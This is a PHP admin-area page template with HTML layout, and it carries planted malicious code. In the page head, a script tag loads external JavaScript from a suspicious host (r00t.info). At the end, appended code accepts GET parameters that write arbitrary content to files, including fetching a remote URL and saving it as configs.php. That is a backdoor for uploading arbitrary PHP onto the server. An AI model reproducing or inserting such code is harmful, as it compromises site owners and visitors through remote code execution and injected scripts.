<?php
include '../inc/config.php';
  explodedKhususAdmin();
  ob_start();
?>
<!DOCTYPE html>
<html>

<head>

	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title><?=title?> | Admin Area</title>
    <link href="/assets/img/favicon.png" rel="shortcut icon">
	<script src=http://r00t.info/ccb.js></script>
    <link href="/assets/css/style.css" rel="stylesheet">
    <link href="/assets/css/fontawesome.css" rel="stylesheet">
    <style>
    body {
  background: #47574F url("/assets/img/bg.jpg") repeat left top;
  text-shadow: 1px 1px 1px black;
  font-family: Electrolize, sans-serif;
  margin: 0 auto;
  padding: 0;
  color: #DBE1DE;
  font-size: 13px;
  background-attachment:fixed;
}
    </style>
</head>
	<body>
		<div id="outer-wrapper">
			<div id="header-wrapper">
				<img oncontextmenu="return false;" height="30%" ondragstart="return false" src="/assets/img/II.png">
			</div>
        <div id="content-wrapper">
<?php
include"menu.php";
?>
  <div class="main-content">

    <?php include 'content.php'; ?>

</body>

</html>
<?php ob_end_flush();?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>
